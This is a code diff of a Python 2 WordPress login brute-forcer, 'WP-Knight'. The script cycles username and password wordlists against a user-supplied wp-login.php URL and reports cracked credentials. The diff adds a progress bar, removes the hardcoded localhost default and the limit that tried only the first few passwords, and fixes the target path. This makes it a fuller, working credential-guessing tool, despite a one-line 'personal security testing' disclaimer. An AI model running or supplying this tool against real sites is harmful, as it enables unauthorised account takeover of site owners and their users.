@@ -1,6 +1,6 @@
 
 # WordPress Cracker 6/19/2018
-# Coded by Pythogen
+# Coded by LogicPy
 
 # Intended for personal security testing. Please do not use on servers you don't own.
 # WP-Knight was created as a mini alternative to WPScan.
@@ -9,6 +9,7 @@
 
 import sys
 import requests
+from tqdm import tqdm
 
 print """
 
@@ -19,12 +20,10 @@ print """
 	| || || | |          | |  \ \| | | | ( (_| | | | || |_ 
 	 \_____/|_|          |_|   \_)_| |_|_|\___ |_| |_| \__)
 	                                     (_____|           
-	 Coded by Pythogen (WordPress 4.9.6+)
+	 Coded by LogicPy (WordPress 4.9.6+)
 
 """
 
-# Default login URL (Use 'url' command to set your target)
-login_URL = "http://127.0.0.1/wp/wordpress/wp-login.php"
 # Detecting incorrect password
 keyword = "incorrect"
 # Detecting invalid username
@@ -32,11 +31,9 @@ keyword2 = "Invalid"
 # Detecting empty field
 keyword3 = "empty"
 
-uname = 'a'
-pwd = 'a'
-inc = 0
-aPlace = 0
-bPlace = 3
+login_URL = None
+uname = None
+pwd = None
 
 def console():
 	while(True):
@@ -51,8 +48,11 @@ def console():
 		elif cmd == "exit":
 			sys.exit()
 		elif cmd == "go":
-			print "\n WP-Knight Activated! \n"
-			bruteforce()
+			if login_URL == None:
+				print "\n Please specify URL \n"
+			else:		
+				print "\n WP-Knight Activated! \n"
+				bruteforce()
 		elif cmd == "url":
 			url_config()
 		elif cmd == "version":
@@ -74,7 +74,8 @@ def url_config():
 	global redirect
 	login_URL = raw_input("\n Enter target URL: ")
 	host = find_between(login_URL,"//","/")
-	redirect = 'http://%s/wp/wordpress/wp-admin/' % (host)
+	redirect = 'http://%s/wp-login.php' % (host)
+	print "\n Target: %s" % (redirect)
 	print ""
 
 def versionCheck():
@@ -102,15 +103,21 @@ def bruteforce():
 		# Password List
 		PASSWORD = text_file2.read().split('\n')
 
+		# Calculate total number of cycles
+		totalCalc = (int(len(PASSWORD)) * int(len(USERNAME)))
+
+		# Configure progress bar with total value
+		progressBar = tqdm(total=totalCalc)
+
 		# Username cycle
 		for u in USERNAME:
-			# Password cycle (Only first three words)
-			#for p in PASSWORD[aPlace:bPlace]:
+
+			# Password cycle
 			for p in PASSWORD:
 				# Print process
 				uname = u
 				pwd = p
-				print ' %s:%s' % (u,p)
+				progressBar.update(1)
 
 				# 1) Direct to login url. Prepare for POST login
 				c.get(login_URL)
@@ -126,9 +133,7 @@ def bruteforce():
 				}
 
 				#Header data
-				header_data = \
-				{
-				}
+				header_data = {}
 
 				# 2) Submit POST data. Initialize login
 				bruteforce.page = c.post(login_URL, data=login_data, headers=header_data)
@@ -141,21 +146,16 @@ def bruteforce():
 				# Check = incorrect , Check2 = invalid
 				# If 'incorrect' and 'invalid' not found, then you've cracked the password.
 				if Check == -1 and Check2 == -1 and Check3 == -1:
-					print "\n Cracked: %s:%s \n" % (u,p)
-					return
+					progressBar.close()
+					print "\n Cracked [ %s : %s ] \n" % (u,p)
+					break
 				# Otherwise, continue..
 				else:
 					pass
 
 		text_file.close()
 		text_file2.close()
-		#aPlace = aPlace + 3
-		#bPlace = bPlace + 3
-		print ""
 
-
-# Set request header details:
-host = find_between(login_URL,"//","/")
-redirect = 'http://%s/wp/wordpress/wp-admin/' % (host)
+		console()
 
 console()
